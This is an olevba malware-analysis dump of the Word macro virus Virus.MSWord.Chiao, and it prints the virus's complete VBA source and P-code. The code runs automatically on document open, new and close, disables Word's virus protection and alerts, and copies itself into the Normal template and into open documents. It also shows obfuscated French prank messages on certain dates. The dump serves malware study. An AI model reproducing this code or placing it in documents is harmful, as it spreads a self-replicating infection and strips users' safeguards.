olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Chiao
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Chiao - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
                                                                                                    Private Sub Document_Close()
                                                                                                    Dim objet As Variant
                                                                                                    Dim objet2 As Variant
                                                                                                    Dim feuille As Variant
                                                                                                    Dim Var_Start, Var_Start2 As Long
                                                                                                    Dim Var_Count, Var_Count2 As Long
                                                                                                    Dim TempString As String
                                                                                                    Dim Date1 As Date
                                                                                                    Dim Date2 As Date
                                                                                                    Dim Date3 As Date
                                                                                                    Date1 = "03/04/2000"
                                                                                                    Date2 = "10/05/2000"
                                                                                                    Date3 = "15/09/2000"
                                                                                                    On Error Resume Next
                                                                                                    Options.VirusProtection = False
                                                                                                    Application.DisplayAlerts = wdAlertsNone
                                                                                                    Set feuille = Application.ActiveDocument
                                                                                                    Set objet = feuille.VBProject.VBComponents.Item("ThisDocument")
                                                                                                    If Not objet.CodeModule.Find("{ - This function should never be deleted -  } V2", 1, 1, 1, 1) Then
                                                                                                    For i = 1 To objet.CodeModule.CountOfLines
                                                                                                    objet.CodeModule.DeleteLines 1
                                                                                                    Next
                                                                                                    Var_Start = objet.CodeModule.CountOfLines + 1
                                                                                                    Set objet2 = NormalTemplate.VBProject.VBComponents.Item("ThisDocument")
                                                                                                    Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_Open", vbext_pk_Proc)
                                                                                                    Var_Count2 = objet2.CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                                                                                                    For i = Var_Start2 + 1 To Var_Count2 + Var_Start2 - 2
                                                                                                    TempString = RTrim(objet2.CodeModule.Lines(i, 1))
                                                                                                    objet.CodeModule.AddFromString TempString
                                                                                                    Next
                                                                                                    Var_garb = objet.CodeModule.InsertLines(1, "                                                                                                    Private Sub Document_Open()")
                                                                                                    Var_Start = Var_Start + Var_Count2 + 1
                                                                                                    Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_New", vbext_pk_Proc)
                                                                                                    Var_Count2 = objet2.CodeModule.ProcCountLines("Document_New", vbext_pk_Proc)
                                                                                                    For i = Var_Start2 + 1 To Var_Count2 + Var_Start2 - 2
                                                                                                    TempString = RTrim(objet2.CodeModule.Lines(i, 1))
                                                                                                    objet.CodeModule.AddFromString TempString
                                                                                                    Next
                                                                                                    Var_garb = objet.CodeModule.InsertLines(1, "                                                                                                    Private Sub Document_New()")
                                                                                                    Var_Start = Var_Start + Var_Count2 + 1
                                                                                                    Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
                                                                                                    Var_Count2 = objet2.CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
                                                                                                    For i = Var_Start2 + 1 To Var_Count2 + Var_Start2 - 2
                                                                                                    TempString = RTrim(objet2.CodeModule.Lines(i, 1))
                                                                                                    objet.CodeModule.AddFromString TempString
                                                                                                    Next
                                                                                                    Var_garb = objet.CodeModule.InsertLines(1, "                                                                                                    Private Sub Document_Close()")
                                                                                                    End If
                                                                                                    If Date > Date3 Then
                                                                                                    Selection.EndKey Unit:=wdStory
                                                                                                    Selection.TypeParagraph
                                                                                                    Selection.TypeText Text:="C" & "i" & "a" & "o" & " !" & "!" & "!"
                                                                                                    Selection.HomeKey Unit:=wdLine, Extend:=wdExtend
                                                                                                    Selection.Font.Bold = wdToggle
                                                                                                    Selection.Font.Size = 18
                                                                                                    Selection.Font.Name = "CourierBM"
                                                                                                    Selection.Font.Name = "Bookman Old Style"
                                                                                                    Options.DefaultHighlightColorIndex = wdBrightGreen
                                                                                                    Selection.Range.HighlightColorIndex = wdBrightGreen
                                                                                                    Selection.Font.ColorIndex = wdRed
                                                                                                    Selection.ParagraphFormat.Alignment = wdAlignParagraphRight
                                                                                                    Selection.HomeKey Unit:=wdStory
                                                                                                    End If
                                                                                                    If (Date >= Date1 And Date <= Date2) Or Format(Date, "dddd") = "Mercredi" And Date >= Date1 Then
                                                                                                    temporary = MsgBox("Me" & "r" & "ci" & " d'" & "avo" & "ir " & "uti" & "li" & "sé" & " ce b" & "e" & "l ou" & "ti" & "l qu" & "'" & "e" & "st " & "M" & "." & "S" & ". " & "W" & "O" & "R" & "D" & "S !" & "!" & "!" & Chr(13) & Chr(13) & "B" & "i" & "l" & "l" & " G" & "A" & "T" & "E" & "S " & "vo" & "us le" & " ren" & "dr" & "a " & "!", vbSystemModal + vbInformation + vbOKOnly, "Vive les mercredi et les jours fériés...")
                                                                                                    End If
                                                                                                    Application.ActiveDocument.Save
                                                                                                    End Sub
                                                                                                    Private Sub Document_New()
                                                                                                    Dim Date1 As Date
                                                                                                    Dim Date2 As Date
                                                                                                    Dim Date3 As Date
                                                                                                    Date1 = "03/04/2000"
                                                                                                    Date2 = "10/05/2000"
                                                                                                    Date3 = "15/09/2000"
                                                                                                    On Error Resume Next
                                                                                                    Options.VirusProtection = False
                                                                                                    Application.DisplayAlerts = wdAlertsNone
                                                                                                    If (Date >= Date1 And Date <= Date2) Or Date > Date3 Or Format(Date, "dddd") = "Mercredi" And Date >= Date1 Then
                                                                                                    Selection.HomeKey Unit:=wdLine
                                                                                                    Selection.HomeKey Unit:=wdStory
                                                                                                    Selection.TypeParagraph
                                                                                                    Selection.MoveUp Unit:=wdLine, Count:=1
                                                                                                    Selection.TypeText Text:="Mi" & "cr" & "os" & "of" & "t vo" & "us s" & "ouh" & "ait" & "e la" & " b" & "ie" & "nv" & "en" & "ue !" & "!" & "!"
                                                                                                    Selection.HomeKey Unit:=wdLine, Extend:=wdExtend
                                                                                                    Selection.Range.HighlightColorIndex = wdBrightGreen
                                                                                                    Selection.Font.ColorIndex = wdRed
                                                                                                    Selection.Font.Size = 12
                                                                                                    Selection.Font.Size = 16
                                                                                                    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
                                                                                                    Selection.MoveDown Unit:=wdLine, Count:=1
                                                                                                    End If
                                                                                                    End Sub
                                                                                                    Private Sub Document_Open()
                                                                                                    '{ - This function should never be deleted -  } V2
                                                                                                    '{ - This function should never be deleted - }
                                                                                                    Dim objet As Variant
                                                                                                    Dim objet2 As Variant
                                                                                                    Dim Var_Start, Var_Start2 As Long
                                                                                                    Dim Var_Count, Var_Count2 As Long
                                                                                                    On Error Resume Next
                                                                                                    Options.VirusProtection = False
                                                                                                    Application.DisplayAlerts = wdAlertsNone
                                                                                                    Set objet = NormalTemplate.VBProject.VBComponents.Item("ThisDocument")
                                                                                                    If Not objet.CodeModule.Find("{ - This function should never be deleted -  } V2", 1, 1, 1, 1) Then
                                                                                                    For i = 1 To objet.CodeModule.CountOfLines
                                                                                                    objet.CodeModule.DeleteLines 1
                                                                                                    Next
                                                                                                    Var_Start = objet.CodeModule.CountOfLines + 1
                                                                                                    Set objet2 = Me.VBProject.VBComponents.Item("ThisDocument")
                                                                                                    Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_Open", vbext_pk_Proc)
                                                                                                    Var_Count2 = objet2.CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                                                                                                    objet.CodeModule.InsertLines Var_Start, Chr(13) & objet2.CodeModule.Lines(Var_Start2, Var_Count2)
                                                                                                    Var_Start = Var_Start + Var_Count2 + 1
                                                                                                    Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_New", vbext_pk_Proc)
                                                                                                    Var_Count2 = objet2.CodeModule.ProcCountLines("Document_New", vbext_pk_Proc)
                                                                                                    objet.CodeModule.InsertLines Var_Start, Chr(13) & objet2.CodeModule.Lines(Var_Start2, Var_Count2)
                                                                                                    Var_Start = Var_Start + Var_Count2 + 1
                                                                                                    Var_Start2 = objet2.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
                                                                                                    Var_Count2 = objet2.CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
                                                                                                    objet.CodeModule.InsertLines Var_Start, Chr(13) & objet2.CodeModule.Lines(Var_Start2, Var_Count2)
                                                                                                    NormalTemplate.Save
                                                                                                    End If
                                                                                                    End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Chiao
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 16458 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	Dim 
' 	VarDefn objet (As Variant)
' Line #2:
' 	Dim 
' 	VarDefn objet2 (As Variant)
' Line #3:
' 	Dim 
' 	VarDefn feuille (As Variant)
' Line #4:
' 	Dim 
' 	VarDefn Var_Start
' 	VarDefn Var_Start2 (As Long)
' Line #5:
' 	Dim 
' 	VarDefn Var_Count
' 	VarDefn Var_Count2 (As Long)
' Line #6:
' 	Dim 
' 	VarDefn TempString (As String)
' Line #7:
' 	Dim 
' 	VarDefn Date1 (As Date)
' Line #8:
' 	Dim 
' 	VarDefn Date2 (As Date)
' Line #9:
' 	Dim 
' 	VarDefn Date3 (As Date)
' Line #10:
' 	LitStr 0x000A "03/04/2000"
' 	St Date1 
' Line #11:
' 	LitStr 0x000A "10/05/2000"
' 	St Date2 
' Line #12:
' 	LitStr 0x000A "15/09/2000"
' 	St Date3 
' Line #13:
' 	OnError (Resume Next) 
' Line #14:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #15:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #16:
' 	SetStmt 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	Set feuille 
' Line #17:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld feuille 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set objet 
' Line #18:
' 	LitStr 0x0031 "{ - This function should never be deleted -  } V2"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	IfBlock 
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld objet 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #20:
' 	LitDI2 0x0001 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #21:
' 	StartForVariable 
' 	Next 
' Line #22:
' 	Ld objet 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	St Var_Start 
' Line #23:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set objet2 
' Line #24:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start2 
' Line #25:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count2 
' Line #26:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld Var_Start2 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld Var_Count2 
' 	Ld Var_Start2 
' 	Add 
' 	LitDI2 0x0002 
' 	Sub 
' 	For 
' Line #27:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd RTrim 0x0001 
' 	St TempString 
' Line #28:
' 	Ld TempString 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #29:
' 	StartForVariable 
' 	Next 
' Line #30:
' 	LitDI2 0x0001 
' 	LitStr 0x007F "                                                                                                    Private Sub Document_Open()"
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd InsertLines 0x0002 
' 	St Var_garb 
' Line #31:
' 	Ld Var_Start 
' 	Ld Var_Count2 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	St Var_Start 
' Line #32:
' 	LitStr 0x000C "Document_New"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start2 
' Line #33:
' 	LitStr 0x000C "Document_New"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count2 
' Line #34:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld Var_Start2 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld Var_Count2 
' 	Ld Var_Start2 
' 	Add 
' 	LitDI2 0x0002 
' 	Sub 
' 	For 
' Line #35:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd RTrim 0x0001 
' 	St TempString 
' Line #36:
' 	Ld TempString 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #37:
' 	StartForVariable 
' 	Next 
' Line #38:
' 	LitDI2 0x0001 
' 	LitStr 0x007E "                                                                                                    Private Sub Document_New()"
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd InsertLines 0x0002 
' 	St Var_garb 
' Line #39:
' 	Ld Var_Start 
' 	Ld Var_Count2 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	St Var_Start 
' Line #40:
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start2 
' Line #41:
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count2 
' Line #42:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld Var_Start2 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld Var_Count2 
' 	Ld Var_Start2 
' 	Add 
' 	LitDI2 0x0002 
' 	Sub 
' 	For 
' Line #43:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd RTrim 0x0001 
' 	St TempString 
' Line #44:
' 	Ld TempString 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #45:
' 	StartForVariable 
' 	Next 
' Line #46:
' 	LitDI2 0x0001 
' 	LitStr 0x0080 "                                                                                                    Private Sub Document_Close()"
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd InsertLines 0x0002 
' 	St Var_garb 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	Ld Date 
' 	Ld Date3 
' 	Gt 
' 	IfBlock 
' Line #49:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0001 
' Line #50:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #51:
' 	LitStr 0x0001 "C"
' 	LitStr 0x0001 "i"
' 	Concat 
' 	LitStr 0x0001 "a"
' 	Concat 
' 	LitStr 0x0001 "o"
' 	Concat 
' 	LitStr 0x0002 " !"
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #52:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0002 
' Line #53:
' 	Ld wdToggle 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Bold 
' Line #54:
' 	LitDI2 0x0012 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #55:
' 	LitStr 0x0009 "CourierBM"
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt New 
' Line #56:
' 	LitStr 0x0011 "Bookman Old Style"
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt New 
' Line #57:
' 	Ld wdBrightGreen 
' 	Ld Options 
' 	MemSt DefaultHighlightColorIndex 
' Line #58:
' 	Ld wdBrightGreen 
' 	Ld Selection 
' 	MemLd Range 
' 	MemSt HighlightColorIndex 
' Line #59:
' 	Ld wdRed 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #60:
' 	Ld wdAlignParagraphRight 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #61:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	Ld Date 
' 	Ld Date1 
' 	Ge 
' 	Ld Date 
' 	Ld Date2 
' 	Le 
' 	And 
' 	Paren 
' 	Ld Date 
' 	LitStr 0x0004 "dddd"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0008 "Mercredi"
' 	Eq 
' 	Ld Date 
' 	Ld Date1 
' 	Ge 
' 	And 
' 	Or 
' 	IfBlock 
' Line #64:
' 	LitStr 0x0002 "Me"
' 	LitStr 0x0001 "r"
' 	Concat 
' 	LitStr 0x0002 "ci"
' 	Concat 
' 	LitStr 0x0003 " d'"
' 	Concat 
' 	LitStr 0x0003 "avo"
' 	Concat 
' 	LitStr 0x0003 "ir "
' 	Concat 
' 	LitStr 0x0003 "uti"
' 	Concat 
' 	LitStr 0x0002 "li"
' 	Concat 
' 	LitStr 0x0002 "sé"
' 	Concat 
' 	LitStr 0x0005 " ce b"
' 	Concat 
' 	LitStr 0x0001 "e"
' 	Concat 
' 	LitStr 0x0004 "l ou"
' 	Concat 
' 	LitStr 0x0002 "ti"
' 	Concat 
' 	LitStr 0x0004 "l qu"
' 	Concat 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	LitStr 0x0001 "e"
' 	Concat 
' 	LitStr 0x0003 "st "
' 	Concat 
' 	LitStr 0x0001 "M"
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	LitStr 0x0001 "S"
' 	Concat 
' 	LitStr 0x0002 ". "
' 	Concat 
' 	LitStr 0x0001 "W"
' 	Concat 
' 	LitStr 0x0001 "O"
' 	Concat 
' 	LitStr 0x0001 "R"
' 	Concat 
' 	LitStr 0x0001 "D"
' 	Concat 
' 	LitStr 0x0003 "S !"
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "B"
' 	Concat 
' 	LitStr 0x0001 "i"
' 	Concat 
' 	LitStr 0x0001 "l"
' 	Concat 
' 	LitStr 0x0001 "l"
' 	Concat 
' 	LitStr 0x0002 " G"
' 	Concat 
' 	LitStr 0x0001 "A"
' 	Concat 
' 	LitStr 0x0001 "T"
' 	Concat 
' 	LitStr 0x0001 "E"
' 	Concat 
' 	LitStr 0x0002 "S "
' 	Concat 
' 	LitStr 0x0002 "vo"
' 	Concat 
' 	LitStr 0x0005 "us le"
' 	Concat 
' 	LitStr 0x0004 " ren"
' 	Concat 
' 	LitStr 0x0002 "dr"
' 	Concat 
' 	LitStr 0x0002 "a "
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	Ld vbSystemModal 
' 	Ld vbInformation 
' 	Add 
' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x0028 "Vive les mercredi et les jours fériés..."
' 	ArgsLd MsgBox 0x0003 
' 	St temporary 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #67:
' 	EndSub 
' Line #68:
' 	FuncDefn (Private Sub Document_New())
' Line #69:
' 	Dim 
' 	VarDefn Date1 (As Date)
' Line #70:
' 	Dim 
' 	VarDefn Date2 (As Date)
' Line #71:
' 	Dim 
' 	VarDefn Date3 (As Date)
' Line #72:
' 	LitStr 0x000A "03/04/2000"
' 	St Date1 
' Line #73:
' 	LitStr 0x000A "10/05/2000"
' 	St Date2 
' Line #74:
' 	LitStr 0x000A "15/09/2000"
' 	St Date3 
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #77:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #78:
' 	Ld Date 
' 	Ld Date1 
' 	Ge 
' 	Ld Date 
' 	Ld Date2 
' 	Le 
' 	And 
' 	Paren 
' 	Ld Date 
' 	Ld Date3 
' 	Gt 
' 	Or 
' 	Ld Date 
' 	LitStr 0x0004 "dddd"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0008 "Mercredi"
' 	Eq 
' 	Ld Date 
' 	Ld Date1 
' 	Ge 
' 	And 
' 	Or 
' 	IfBlock 
' Line #79:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #80:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #81:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #82:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveUp 0x0002 
' Line #83:
' 	LitStr 0x0002 "Mi"
' 	LitStr 0x0002 "cr"
' 	Concat 
' 	LitStr 0x0002 "os"
' 	Concat 
' 	LitStr 0x0002 "of"
' 	Concat 
' 	LitStr 0x0004 "t vo"
' 	Concat 
' 	LitStr 0x0004 "us s"
' 	Concat 
' 	LitStr 0x0003 "ouh"
' 	Concat 
' 	LitStr 0x0003 "ait"
' 	Concat 
' 	LitStr 0x0004 "e la"
' 	Concat 
' 	LitStr 0x0002 " b"
' 	Concat 
' 	LitStr 0x0002 "ie"
' 	Concat 
' 	LitStr 0x0002 "nv"
' 	Concat 
' 	LitStr 0x0002 "en"
' 	Concat 
' 	LitStr 0x0004 "ue !"
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #84:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0002 
' Line #85:
' 	Ld wdBrightGreen 
' 	Ld Selection 
' 	MemLd Range 
' 	MemSt HighlightColorIndex 
' Line #86:
' 	Ld wdRed 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #87:
' 	LitDI2 0x000C 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #88:
' 	LitDI2 0x0010 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #89:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #90:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveDown 0x0002 
' Line #91:
' 	EndIfBlock 
' Line #92:
' 	EndSub 
' Line #93:
' 	FuncDefn (Private Sub Document_Open())
' Line #94:
' 	QuoteRem 0x0064 0x0031 "{ - This function should never be deleted -  } V2"
' Line #95:
' 	QuoteRem 0x0064 0x002D "{ - This function should never be deleted - }"
' Line #96:
' 	Dim 
' 	VarDefn objet (As Variant)
' Line #97:
' 	Dim 
' 	VarDefn objet2 (As Variant)
' Line #98:
' 	Dim 
' 	VarDefn Var_Start
' 	VarDefn Var_Start2 (As Long)
' Line #99:
' 	Dim 
' 	VarDefn Var_Count
' 	VarDefn Var_Count2 (As Long)
' Line #100:
' 	OnError (Resume Next) 
' Line #101:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #102:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #103:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set objet 
' Line #104:
' 	LitStr 0x0031 "{ - This function should never be deleted -  } V2"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	IfBlock 
' Line #105:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld objet 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #106:
' 	LitDI2 0x0001 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #107:
' 	StartForVariable 
' 	Next 
' Line #108:
' 	Ld objet 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	St Var_Start 
' Line #109:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set objet2 
' Line #110:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start2 
' Line #111:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count2 
' Line #112:
' 	Ld Var_Start 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ld Var_Start2 
' 	Ld Var_Count2 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #113:
' 	Ld Var_Start 
' 	Ld Var_Count2 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	St Var_Start 
' Line #114:
' 	LitStr 0x000C "Document_New"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start2 
' Line #115:
' 	LitStr 0x000C "Document_New"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count2 
' Line #116:
' 	Ld Var_Start 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ld Var_Start2 
' 	Ld Var_Count2 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #117:
' 	Ld Var_Start 
' 	Ld Var_Count2 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	St Var_Start 
' Line #118:
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start2 
' Line #119:
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count2 
' Line #120:
' 	Ld Var_Start 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ld Var_Start2 
' 	Ld Var_Count2 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #121:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
